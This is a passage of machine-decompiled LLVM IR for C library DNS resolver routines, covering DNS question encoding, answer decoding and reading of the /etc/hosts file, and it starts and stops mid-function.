  store i32 %tmp, i32* @esi, align 4
  %v0_80542ff = load i32, i32* @eax, align 4
  %v1_8054302 = inttoptr i32 %tmp to i32*
  %v2_8054302 = load i32, i32* %v1_8054302, align 4
  %v7_8054304 = inttoptr i32 %v2_8054302 to i8*
  %v8_8054304 = call i32 @__encode_dotted(i8* %v7_8054304, i32 %tmp2, i32 %tmp3, i32 %v0_80542ff, i32 %v0_80542f2, i32 %v0_80542f1, i32 %v0_80542f0)
  %v2_805430c = icmp slt i32 %v8_8054304, 0
  store i32 %v8_8054304, i32* @ecx, align 4
  br i1 %v2_805430c, label %dec_label_pc_805433d, label %dec_label_pc_8054312

dec_label_pc_8054312:                             ; preds = %entry
  %v0_8054312 = load i32, i32* @ebx, align 4
  %v2_8054312 = sub i32 %v0_8054312, %v8_8054304
  %v1_8054314 = add i32 %v2_8054312, -3
  %v6_8054314 = sub i32 2, %v2_8054312
  %v7_8054314 = and i32 %v6_8054314, %v2_8054312
  %v8_8054314 = icmp slt i32 %v7_8054314, 0
  %v9_8054314 = icmp eq i32 %v1_8054314, 0
  %v10_8054314 = icmp slt i32 %v1_8054314, 0
  %v3_8054317 = icmp eq i1 %v10_8054314, %v8_8054314
  %v4_8054317 = icmp eq i1 %v9_8054314, false
  %v5_8054317 = and i1 %v4_8054317, %v3_8054317
  br i1 %v5_8054317, label %dec_label_pc_805431e, label %dec_label_pc_8054319

dec_label_pc_8054319:                             ; preds = %dec_label_pc_8054312
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_805433d

dec_label_pc_805431e:                             ; preds = %dec_label_pc_8054312
  %v0_805431e = load i32, i32* @edi, align 4
  %v2_805431e = add i32 %v0_805431e, %v8_8054304
  store i32 %v2_805431e, i32* @edx, align 4
  %v0_8054321 = load i32, i32* @esi, align 4
  %v1_8054321 = add i32 %v0_8054321, 5
  %v2_8054321 = inttoptr i32 %v1_8054321 to i8*
  %v3_8054321 = load i8, i8* %v2_8054321, align 1
  %v1_8054325 = add i32 %v8_8054304, 4
  store i32 %v1_8054325, i32* @ecx, align 4
  %v3_8054328 = inttoptr i32 %v2_805431e to i8*
  store i8 %v3_8054321, i8* %v3_8054328, align 1
  %v0_805432a = load i32, i32* @esi, align 4
  %v1_805432a = add i32 %v0_805432a, 4
  %v2_805432a = inttoptr i32 %v1_805432a to i32*
  %v3_805432a = load i32, i32* %v2_805432a, align 4
  %v1_805432d = trunc i32 %v3_805432a to i8
  %v2_805432d = load i32, i32* @edx, align 4
  %v3_805432d = add i32 %v2_805432d, 1
  %v4_805432d = inttoptr i32 %v3_805432d to i8*
  store i8 %v1_805432d, i8* %v4_805432d, align 1
  %v0_8054330 = load i32, i32* @esi, align 4
  %v1_8054330 = add i32 %v0_8054330, 9
  %v2_8054330 = inttoptr i32 %v1_8054330 to i8*
  %v3_8054330 = load i8, i8* %v2_8054330, align 1
  %v2_8054334 = load i32, i32* @edx, align 4
  %v3_8054334 = add i32 %v2_8054334, 2
  %v4_8054334 = inttoptr i32 %v3_8054334 to i8*
  store i8 %v3_8054330, i8* %v4_8054334, align 1
  %v0_8054337 = load i32, i32* @esi, align 4
  %v1_8054337 = add i32 %v0_8054337, 8
  %v2_8054337 = inttoptr i32 %v1_8054337 to i32*
  %v3_8054337 = load i32, i32* %v2_8054337, align 4
  %v1_805433a = trunc i32 %v3_8054337 to i8
  %v2_805433a = load i32, i32* @edx, align 4
  %v3_805433a = add i32 %v2_805433a, 3
  %v4_805433a = inttoptr i32 %v3_805433a to i8*
  store i8 %v1_805433a, i8* %v4_805433a, align 1
  %v0_805433e.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805433d

dec_label_pc_805433d:                             ; preds = %entry, %dec_label_pc_8054319, %dec_label_pc_805431e
  %v0_805433e = phi i32 [ %v8_8054304, %entry ], [ -1, %dec_label_pc_8054319 ], [ %v0_805433e.pre, %dec_label_pc_805431e ]
  %v2_805433d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805433d, i32* @ebx, align 4
  store i32 %v0_80542f0, i32* @edi, align 4
  ret i32 %v0_805433e

; uselistorder directives
  uselistorder i32 %v1_8054314, { 1, 0 }
  uselistorder i32 %v2_8054312, { 0, 2, 1 }
  uselistorder i32 %v8_8054304, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 8, 4, 5, 6, 0, 7 }
  uselistorder label %dec_label_pc_805433d, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_805434f = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_8054354 = icmp slt i32 %v2_805434f, 0
  %v1_8054356 = add i32 %v2_805434f, 4
  %v1_8054359 = icmp eq i1 %v2_8054354, false
  %v4_8054359 = select i1 %v1_8054359, i32 %v1_8054356, i32 %v2_805434f
  ret i32 %v4_8054359

; uselistorder directives
  uselistorder i32 %v2_805434f, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054360 = load i32, i32* @ebp, align 4
  %v0_8054361 = load i32, i32* @edi, align 4
  %v0_8054362 = load i32, i32* @esi, align 4
  %v0_8054363 = load i32, i32* @ebx, align 4
  store i32 %v0_8054363, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8054384 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8054384, i32* %eax.global-to-local, align 4
  %v4_8054391 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8054384, i32 256)
  store i32 %v4_8054391, i32* %eax.global-to-local, align 4
  %v3_8054399 = icmp slt i32 %v4_8054391, 0
  store i32 %v4_8054391, i32* @edi, align 4
  br i1 %v3_8054399, label %dec_label_pc_805444c, label %dec_label_pc_80543a3

dec_label_pc_80543a3:                             ; preds = %entry
  %v0_80543a3 = load i32, i32* @ebx, align 4
  %v3_80543a3 = add i32 %v0_80543a3, %v4_8054391
  %v0_80543a5 = load i32, i32* @esi, align 4
  %v2_80543a5 = sub i32 %v0_80543a5, %v3_80543a3
  %v1_80543a7 = add i32 %v2_80543a5, -10
  %v10_80543a7 = icmp slt i32 %v1_80543a7, 0
  store i32 %v1_80543a7, i32* @esi, align 4
  %v1_80543b2 = icmp eq i1 %v10_80543a7, false
  br i1 %v1_80543b2, label %dec_label_pc_80543bb, label %dec_label_pc_80543b4

dec_label_pc_80543b4:                             ; preds = %dec_label_pc_80543a3
  br label %dec_label_pc_805444c

dec_label_pc_80543bb:                             ; preds = %dec_label_pc_80543a3
  %v6_80543c2 = add i32 %v3_80543a3, %tmp4
  store i32 %v6_80543c2, i32* @ebx, align 4
  store i32 %v2_8054384, i32* %eax.global-to-local, align 4
  %v1_80543ce = bitcast i32* %stack_var_-272 to i8*
  %v2_80543ce = call i32 @__GI_strdup(i8* %v1_80543ce)
  store i32 %v2_80543ce, i32* %eax.global-to-local, align 4
  %v0_80543d3 = load i32, i32* @ebx, align 4
  %v1_80543d3 = add i32 %v0_80543d3, 4
  store i32 %v1_80543d3, i32* %esi.global-to-local, align 4
  %v1_80543d6 = load i32, i32* @ebp, align 4
  %v2_80543d6 = inttoptr i32 %v1_80543d6 to i32*
  store i32 %v2_80543ce, i32* %v2_80543d6, align 4
  %v0_80543d9 = load i32, i32* @ebx, align 4
  %v1_80543d9 = inttoptr i32 %v0_80543d9 to i8*
  %v2_80543d9 = load i8, i8* %v1_80543d9, align 1
  %v3_80543d9 = zext i8 %v2_80543d9 to i32
  store i32 %v3_80543d9, i32* %eax.global-to-local, align 4
  %v1_80543dc = add i32 %v0_80543d9, 1
  %v2_80543dc = inttoptr i32 %v1_80543dc to i8*
  %v3_80543dc = load i8, i8* %v2_80543dc, align 1
  %v4_80543dc = zext i8 %v3_80543dc to i32
  store i32 %v4_80543dc, i32* %edx.global-to-local, align 4
  %v2_80543e0 = mul nuw nsw i32 %v3_80543d9, 256
  %v2_80543e3 = or i32 %v4_80543dc, %v2_80543e0
  store i32 %v2_80543e3, i32* %eax.global-to-local, align 4
  %v1_80543e5 = load i32, i32* @ebp, align 4
  %v2_80543e5 = add i32 %v1_80543e5, 4
  %v3_80543e5 = inttoptr i32 %v2_80543e5 to i32*
  store i32 %v2_80543e3, i32* %v3_80543e5, align 4
  %v0_80543e8 = load i32, i32* @ebx, align 4
  %v1_80543e8 = add i32 %v0_80543e8, 2
  %v2_80543e8 = inttoptr i32 %v1_80543e8 to i8*
  %v3_80543e8 = load i8, i8* %v2_80543e8, align 1
  %v4_80543e8 = zext i8 %v3_80543e8 to i32
  store i32 %v4_80543e8, i32* %eax.global-to-local, align 4
  %v1_80543ec = add i32 %v0_80543e8, 3
  %v2_80543ec = inttoptr i32 %v1_80543ec to i8*
  %v3_80543ec = load i8, i8* %v2_80543ec, align 1
  %v4_80543ec = zext i8 %v3_80543ec to i32
  store i32 %v4_80543ec, i32* %edx.global-to-local, align 4
  %v2_80543f0 = mul nuw nsw i32 %v4_80543e8, 256
  %v2_80543f3 = or i32 %v4_80543ec, %v2_80543f0
  store i32 %v2_80543f3, i32* %eax.global-to-local, align 4
  %v1_80543f5 = load i32, i32* @ebp, align 4
  %v2_80543f5 = add i32 %v1_80543f5, 8
  %v3_80543f5 = inttoptr i32 %v2_80543f5 to i32*
  store i32 %v2_80543f3, i32* %v3_80543f5, align 4
  %v0_80543f8 = load i32, i32* @ebx, align 4
  %v1_80543f8 = add i32 %v0_80543f8, 4
  %v2_80543f8 = inttoptr i32 %v1_80543f8 to i8*
  %v3_80543f8 = load i8, i8* %v2_80543f8, align 1
  %v4_80543f8 = zext i8 %v3_80543f8 to i32
  store i32 %v4_80543f8, i32* %edx.global-to-local, align 4
  %v0_80543fc = load i32, i32* %esi.global-to-local, align 4
  %v1_80543fc = add i32 %v0_80543fc, 1
  %v2_80543fc = inttoptr i32 %v1_80543fc to i8*
  %v3_80543fc = load i8, i8* %v2_80543fc, align 1
  %v4_80543fc = zext i8 %v3_80543fc to i32
  store i32 %v4_80543fc, i32* %eax.global-to-local, align 4
  %v1_8054400 = add i32 %v0_80543fc, 2
  %v2_8054400 = inttoptr i32 %v1_8054400 to i8*
  %v3_8054400 = load i8, i8* %v2_8054400, align 1
  %v4_8054400 = zext i8 %v3_8054400 to i32
  %v2_8054404 = mul nuw i32 %v4_80543f8, 16777216
  %v2_8054407 = mul nuw nsw i32 %v4_80543fc, 65536
  store i32 %v2_8054407, i32* %eax.global-to-local, align 4
  %v2_805440a = or i32 %v2_8054407, %v2_8054404
  store i32 %v2_805440a, i32* %edx.global-to-local, align 4
  %v1_805440c = add i32 %v0_80543fc, 3
  %v2_805440c = inttoptr i32 %v1_805440c to i8*
  %v3_805440c = load i8, i8* %v2_805440c, align 1
  %v4_805440c = zext i8 %v3_805440c to i32
  store i32 %v4_805440c, i32* %eax.global-to-local, align 4
  %v2_8054410 = mul nuw nsw i32 %v4_8054400, 256
  %v2_8054413 = or i32 %v4_805440c, %v2_805440a
  store i32 %v2_8054413, i32* %edx.global-to-local, align 4
  %v2_8054415 = or i32 %v2_8054413, %v2_8054410
  store i32 %v2_8054415, i32* @ecx, align 4
  %v1_8054417 = load i32, i32* @ebp, align 4
  %v2_8054417 = add i32 %v1_8054417, 12
  %v3_8054417 = inttoptr i32 %v2_8054417 to i32*
  store i32 %v2_8054415, i32* %v3_8054417, align 4
  %v0_805441a = load i32, i32* @ebx, align 4
  %v1_805441a = add i32 %v0_805441a, 8
  %v2_805441a = inttoptr i32 %v1_805441a to i8*
  %v3_805441a = load i8, i8* %v2_805441a, align 1
  %v4_805441a = zext i8 %v3_805441a to i32
  store i32 %v4_805441a, i32* %edx.global-to-local, align 4
  %v1_805441e = add i32 %v0_805441a, 9
  %v2_805441e = inttoptr i32 %v1_805441e to i8*
  %v3_805441e = load i8, i8* %v2_805441e, align 1
  %v4_805441e = zext i8 %v3_805441e to i32
  store i32 %v4_805441e, i32* %eax.global-to-local, align 4
  %v1_8054422 = add i32 %v0_805441a, 10
  %v1_8054425 = load i32, i32* @ebp, align 4
  %v2_8054425 = add i32 %v1_8054425, 20
  %v3_8054425 = inttoptr i32 %v2_8054425 to i32*
  store i32 %v1_8054422, i32* %v3_8054425, align 4
  %v0_8054428 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054428 = mul i32 %v0_8054428, 256
  %v1_805442b = load i32, i32* %eax.global-to-local, align 4
  %v2_805442b = or i32 %v1_805442b, %v2_8054428
  store i32 %v2_805442b, i32* @edx, align 4
  %v1_805442d = load i32, i32* @ebp, align 4
  %v2_805442d = add i32 %v1_805442d, 16
  %v3_805442d = inttoptr i32 %v2_805442d to i32*
  store i32 %v2_805442b, i32* %v3_805442d, align 4
  %v1_8054437 = add i32 %v3_80543a3, 10
  store i32 %v1_8054437, i32* %eax.global-to-local, align 4
  %v1_805443a = load i32, i32* @ebp, align 4
  %v2_805443a = add i32 %v1_805443a, 24
  %v3_805443a = inttoptr i32 %v2_805443a to i32*
  store i32 %v1_8054437, i32* %v3_805443a, align 4
  %v4_805443d = load i32, i32* @edx, align 4
  %v5_8054441 = icmp slt i32 %v1_80543a7, %v4_805443d
  br i1 %v5_8054441, label %dec_label_pc_8054443, label %dec_label_pc_8054448

dec_label_pc_8054443:                             ; preds = %dec_label_pc_80543bb
  br label %dec_label_pc_805444c

dec_label_pc_8054448:                             ; preds = %dec_label_pc_80543bb
  %v1_8054448 = load i32, i32* @edi, align 4
  %v2_8054448 = add i32 %v4_805443d, 10
  %v3_8054448 = add i32 %v2_8054448, %v1_8054448
  br label %dec_label_pc_805444c

dec_label_pc_805444c:                             ; preds = %entry, %dec_label_pc_8054443, %dec_label_pc_80543b4, %dec_label_pc_8054448
  %v0_8054452 = phi i32 [ %v4_8054391, %entry ], [ -1, %dec_label_pc_8054443 ], [ %v1_80543a7, %dec_label_pc_80543b4 ], [ %v3_8054448, %dec_label_pc_8054448 ]
  store i32 %v0_8054452, i32* %eax.global-to-local, align 4
  %v2_8054454 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054454, i32* @ebx, align 4
  store i32 %v0_8054362, i32* @esi, align 4
  store i32 %v0_8054361, i32* @edi, align 4
  store i32 %v0_8054360, i32* @ebp, align 4
  ret i32 %v0_8054452

; uselistorder directives
  uselistorder i32 %v0_8054452, { 1, 0 }
  uselistorder i32 %v2_8054407, { 1, 0 }
  uselistorder i32 %v1_80543a7, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80543a3, { 1, 0, 2 }
  uselistorder i32 %v4_8054391, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8054384, { 1, 0, 2 }
  uselistorder i32 24, { 29, 30, 19, 0, 31, 32, 33, 20, 4, 9, 36, 10, 11, 12, 34, 21, 22, 23, 24, 25, 26, 27, 38, 1, 35, 13, 14, 15, 16, 17, 2, 18, 3, 5, 6, 7, 8, 28, 37 }
  uselistorder i32 20, { 31, 32, 33, 34, 1, 20, 38, 4, 39, 35, 36, 2, 21, 22, 0, 6, 7, 30, 8, 9, 10, 23, 24, 25, 26, 27, 5, 28, 29, 41, 37, 3, 11, 12, 13, 14, 15, 16, 17, 18, 19, 40 }
  uselistorder i32 9, { 16, 17, 18, 19, 5, 20, 10, 11, 4, 9, 0, 6, 12, 13, 14, 15, 7, 8, 2, 1, 21, 22, 3 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 7, 9, 8, 11, 10 }
  uselistorder i32 3, { 47, 48, 49, 50, 51, 52, 20, 0, 11, 1, 21, 2, 16, 46, 3, 53, 22, 5, 4, 6, 9, 10, 8, 23, 12, 24, 39, 19, 40, 29, 54, 17, 18, 30, 25, 14, 15, 7, 27, 45, 26, 31, 32, 33, 34, 35, 41, 42, 43, 44, 28, 36, 37, 38, 13 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805444c, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8054469 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_8058645.258 to i32), i32 ptrtoint (i32* @global_var_8058610.246 to i32))
  store i32 %v3_8054469, i32* @eax, align 4
  %v1_8054471 = icmp eq i32 %v3_8054469, 0
  %v1_8054473 = icmp eq i1 %v1_8054471, false
  br i1 %v1_8054473, label %dec_label_pc_8054489, label %dec_label_pc_8054475

dec_label_pc_8054475:                             ; preds = %entry
  %v3_8054481 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8058650.259 to i32), i32 ptrtoint (i32* @global_var_8058610.246 to i32))
  br label %dec_label_pc_8054489

dec_label_pc_8054489:                             ; preds = %entry, %dec_label_pc_8054475
  %v0_805448c = phi i32 [ %v3_8054469, %entry ], [ %v3_8054481, %dec_label_pc_8054475 ]
  ret i32 %v0_805448c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8058610.246 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8054489, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_805448d = load i32, i32* @ebp, align 4
  %v0_805448e = load i32, i32* @edi, align 4
  %v0_805448f = load i32, i32* @esi, align 4
  %v0_8054490 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_805449e = sub i32 0, %arg6
  %v1_80544a0 = urem i32 %v1_805449e, 4
  %v2_80544a0 = icmp eq i32 %v1_80544a0, 0
  store i32 %v1_80544a0, i32* %eax.global-to-local, align 4
  br i1 %v2_80544a0, label %dec_label_pc_80544b1, label %dec_label_pc_80544a5

dec_label_pc_80544a5:                             ; preds = %entry
  %v2_80544a5 = sub i32 %arg7, %v1_80544a0
  %v7_80544a5 = icmp ugt i32 %v1_80544a0, %arg7
  br i1 %v7_80544a5, label %dec_label_pc_8054755, label %dec_label_pc_80544ad

dec_label_pc_80544ad:                             ; preds = %dec_label_pc_80544a5
  %v2_80544ad = add i32 %v1_80544a0, %arg6
  store i32 %v2_80544ad, i32* @ebx, align 4
  store i32 %v2_80544a5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80544b1

dec_label_pc_80544b1:                             ; preds = %entry, %dec_label_pc_80544ad
  %v0_80544bf = phi i32 [ %arg6, %entry ], [ %v2_80544ad, %dec_label_pc_80544ad ]
  %v0_80544c6 = phi i32 [ %arg7, %entry ], [ %v2_80544a5, %dec_label_pc_80544ad ]
  %tmp = icmp ult i32 %v0_80544c6, 32
  br i1 %tmp, label %dec_label_pc_8054755, label %dec_label_pc_80544ba

dec_label_pc_80544ba:                             ; preds = %dec_label_pc_80544b1
  %v12_80544ba = icmp eq i32 %arg4, 1
  %v1_80544bf = add i32 %v0_80544bf, 32
  store i32 %v1_80544bf, i32* %eax.global-to-local, align 4
  %v1_80544c6 = add i32 %v0_80544c6, -32
  store i32 %v1_80544c6, i32* @ebp, align 4
  br i1 %v12_80544ba, label %dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge, label %dec_label_pc_80544cf

dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge: ; preds = %dec_label_pc_80544ba
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8054605

dec_label_pc_80544cf:                             ; preds = %dec_label_pc_80544ba
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_80544d6 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_80544d6, align 4
  %tmp144 = icmp ult i32 %v1_80544c6, 4
  br i1 %tmp144, label %dec_label_pc_8054755, label %dec_label_pc_80544e2

dec_label_pc_80544e2:                             ; preds = %dec_label_pc_80544cf
  %v0_80544e2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80544e2 = add i32 %v0_80544e2, -36
  store i32 %v1_80544e2, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_80544e2, 8
  br i1 %tmp145, label %dec_label_pc_8054755, label %dec_label_pc_80544ee

dec_label_pc_80544ee:                             ; preds = %dec_label_pc_80544e2
  %v0_80544ee = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_80544ee, 16
  br i1 %tmp146, label %dec_label_pc_8054755, label %dec_label_pc_80544f7

dec_label_pc_80544f7:                             ; preds = %dec_label_pc_80544ee
  %v1_80544f7 = add i32 %v0_80544e2, -48
  store i32 %v1_80544f7, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_80544f7, 8
  br i1 %tmp147, label %dec_label_pc_8054755, label %dec_label_pc_8054503

dec_label_pc_8054503:                             ; preds = %dec_label_pc_80544f7
  %v0_8054503 = load i32, i32* @ebx, align 4
  %v1_8054503 = add i32 %v0_8054503, 48
  %v1_8054506 = add i32 %v0_80544e2, -44
  store i32 %v1_8054506, i32* @ebp, align 4
  %v1_805450d = add i32 %v0_80544e2, -56
  store i32 %v1_805450d, i32* @eax, align 4
  %v7_8054510 = icmp ult i32 %v1_805450d, %v1_8054506
  %v1_8054512 = add i32 %v0_8054503, 36
  store i32 %v1_8054512, i32* @edi, align 4
  br i1 %v7_8054510, label %dec_label_pc_805451c, label %dec_label_pc_8054517

dec_label_pc_8054517:                             ; preds = %dec_label_pc_8054503
  %v1_8054517 = add i32 %v0_8054503, 44
  store i32 %v1_8054517, i32* @esi, align 4
  br label %dec_label_pc_8054521

dec_label_pc_805451c:                             ; preds = %dec_label_pc_8054503
  %v1_805451c = add i32 %v0_8054503, 56
  store i32 %v1_805451c, i32* @esi, align 4
  store i32 %v1_805450d, i32* @ebp, align 4
  br label %dec_label_pc_8054521

dec_label_pc_8054521:                             ; preds = %dec_label_pc_8054517, %dec_label_pc_805451c
  %v0_8054521 = phi i32 [ %v1_8054506, %dec_label_pc_8054517 ], [ %v1_805450d, %dec_label_pc_805451c ]
  %tmp148 = icmp ult i32 %v0_8054521, 80
  br i1 %tmp148, label %dec_label_pc_8054755, label %dec_label_pc_805452a

dec_label_pc_805452a:                             ; preds = %dec_label_pc_8054521
  %v0_805452a = call i32 @__open_etc_hosts()
  store i32 %v0_805452a, i32* %eax.global-to-local, align 4
  %v1_805452f = icmp eq i32 %v0_805452a, 0
  br i1 %v1_805452f, label %dec_label_pc_8054557, label %dec_label_pc_8054537

dec_label_pc_8054537:                             ; preds = %dec_label_pc_805452a
  store i32 %v1_80544bf, i32* %edx.global-to-local, align 4
  store i32 %v1_8054503, i32* %eax.global-to-local, align 4
  %v0_805453f = load i32, i32* @edi, align 4
  %v0_8054543 = load i32, i32* @esi, align 4
  %v4_8054547 = inttoptr i32 %v1_80544bf to i8*
  br label %dec_label_pc_8054605

dec_label_pc_8054557:                             ; preds = %dec_label_pc_805452a
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_805455b = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_805455b, align 4
  %v1_8054561 = call i32 @__errno_location(i32 0)
  store i32 %v1_8054561, i32* %eax.global-to-local, align 4
  %v1_8054566 = inttoptr i32 %v1_8054561 to i32*
  %v2_8054566 = load i32, i32* %v1_8054566, align 4
  store i32 %v2_8054566, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054755

dec_label_pc_8054571:                             ; preds = %dec_label_pc_80546d8
  %v2_8054571 = load i8*, i8** %stack_var_-44, align 4
  %v3_8054571 = ptrtoint i8* %v2_8054571 to i32
  store i32 %v3_8054571, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8054578 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8054571, i32* %v2_8054578, align 4
  %v0_805457a = load i32, i32* %eax.global-to-local, align 4
  %v1_805457a = add i32 %v0_805457a, 4
  %v2_805457a = inttoptr i32 %v1_805457a to i32*
  store i32 0, i32* %v2_805457a, align 4
  %v0_8054581 = load i32, i32* @ebx, align 4
  %v1_8054581 = add i32 %v0_8054581, 4
  %v2_8054581 = inttoptr i32 %v1_8054581 to i32*
  %v3_8054581 = load i32, i32* %v2_8054581, align 4
  store i32 %v3_8054581, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8054581, i32* %arg5, align 4
  %v1_805458a = add i32 %tmp60, 8
  %v2_805458a = inttoptr i32 %v1_805458a to i32*
  store i32 2, i32* %v2_805458a, align 4
  %v0_8054591 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054591 = add i32 %v0_8054591, 12
  %v2_8054591 = inttoptr i32 %v1_8054591 to i32*
  store i32 4, i32* %v2_8054591, align 4
  br label %dec_label_pc_80545ca

dec_label_pc_805459e:                             ; preds = %dec_label_pc_80546fa
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_80545a6 = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_80545a6, align 4
  %v0_80545a8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80545a8 = add i32 %v0_80545a8, 4
  %v2_80545a8 = inttoptr i32 %v1_80545a8 to i32*
  store i32 0, i32* %v2_80545a8, align 4
  %v0_80545af = load i32, i32* @ebx, align 4
  %v1_80545af = add i32 %v0_80545af, 4
  %v2_80545af = inttoptr i32 %v1_80545af to i32*
  %v3_80545af = load i32, i32* %v2_80545af, align 4
  store i32 %v3_80545af, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80545af, i32* %arg5, align 4
  %v1_80545b8 = add i32 %tmp60, 8
  %v2_80545b8 = inttoptr i32 %v1_80545b8 to i32*
  store i32 10, i32* %v2_80545b8, align 4
  %v0_80545bf = load i32, i32* %edx.global-to-local, align 4
  %v1_80545bf = add i32 %v0_80545bf, 12
  %v2_80545bf = inttoptr i32 %v1_80545bf to i32*
  store i32 16, i32* %v2_80545bf, align 4
  br label %dec_label_pc_80545ca

dec_label_pc_80545ca:                             ; preds = %dec_label_pc_8054571, %dec_label_pc_805459e
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8054571 ], [ %storemerge3, %dec_label_pc_805459e ]
  %v1_80545ca = load i32, i32* %edx.global-to-local, align 4
  %v2_80545ca = add i32 %v1_80545ca, 16
  %v3_80545ca = inttoptr i32 %v2_80545ca to i32*
  store i32 %storemerge, i32* %v3_80545ca, align 4
  %v0_80545cd = load i32, i32* @ebx, align 4
  %v1_80545cd = add i32 %v0_80545cd, 8
  %v1_80545d0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80545d0 = add i32 %v1_80545d0, 4
  %v3_80545d0 = inttoptr i32 %v2_80545d0 to i32*
  store i32 %v1_80545cd, i32* %v3_80545d0, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_80545d7 = load i32, i32* %edx.global-to-local, align 4
  %v2_80545d7 = inttoptr i32 %arg8 to i32*
  store i32 %v0_80545d7, i32* %v2_80545d7, align 4
  br label %dec_label_pc_8054735

dec_label_pc_8054605:                             ; preds = %dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge, %dec_label_pc_8054537
  %v1_8054609.pre-phi = phi i32* [ %.pre, %dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge ], [ %v1_80544d6, %dec_label_pc_8054537 ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge ], [ %v4_8054547, %dec_label_pc_8054537 ]
  %stack_var_-20.0.in = phi i32 [ %v1_80544bf, %dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge ], [ %v0_8054543, %dec_label_pc_8054537 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge ], [ %v1_80544bf, %dec_label_pc_8054537 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge ], [ %v0_805453f, %dec_label_pc_8054537 ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge ], [ %v0_805452a, %dec_label_pc_8054537 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_80544ba.dec_label_pc_8054605_crit_edge ], [ %v1_8054503, %dec_label_pc_8054537 ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8054609.pre-phi, align 4
  %v12_8054693 = icmp eq i32 %arg4, 2
  %v2_80546be = inttoptr i32 %arg2 to i8*
  %v12_80546d1 = icmp eq i32 %arg3, 2
  %v12_80546f3 = icmp eq i32 %arg3, 10
  %v1_805469d = icmp eq i1 %v12_8054693, false
  %v1_80546d6 = icmp eq i1 %v12_80546d1, false
  %v1_80546f8 = icmp eq i1 %v12_80546f3, false
  br label %dec_label_pc_805471b.outer

